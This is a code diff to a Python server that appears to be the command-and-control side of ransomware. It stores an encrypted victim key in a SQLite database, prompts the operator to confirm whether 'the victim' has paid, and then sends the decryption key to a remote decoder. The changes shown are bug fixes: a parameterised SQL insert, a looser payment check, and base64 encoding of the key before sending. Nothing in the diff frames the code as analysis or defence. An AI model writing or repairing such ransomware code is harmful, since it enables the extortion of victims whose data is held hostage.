@@ -7,6 +7,7 @@ import os
 from cryptography.fernet import Fernet
 
 import json
+import base64
 
 HOST = "0.0.0.0"
 PORT = 9443
@@ -49,7 +50,7 @@ def insert_key_to_db(key):
     
     encrypted_key = cipher.encrypt(key)
     
-    cursor.execute("""INSERT INTO Key (key) VALUES (encrypted_key)""")
+    cursor.execute("INSERT INTO Key (key) VALUES (?)", (sqlite3.Binary(encrypted_key),))
     
     conn.commit()
     conn.close()
@@ -61,7 +62,7 @@ def demand_payment():
     paid = False
     while not paid:
         is_paid = input("Is the victim paid [y/n]?")
-        if is_paid == "y":
+        if is_paid.lower() == "y":
             print("Sending decryption key...")
             paid = True
             
@@ -87,12 +88,13 @@ def main():
     
     demand_payment()
     key = fetch_key_from_db()
+    key_base64 = base64.b64encode(key).decode()
     request = {
         "action": "start decoder process",
-        "key": key
+        "key": key_base64
     }
     
-    request = json.dumps(request)
+    request = json.dumps(request).encode()
     secured_conn.send(request)
     
     
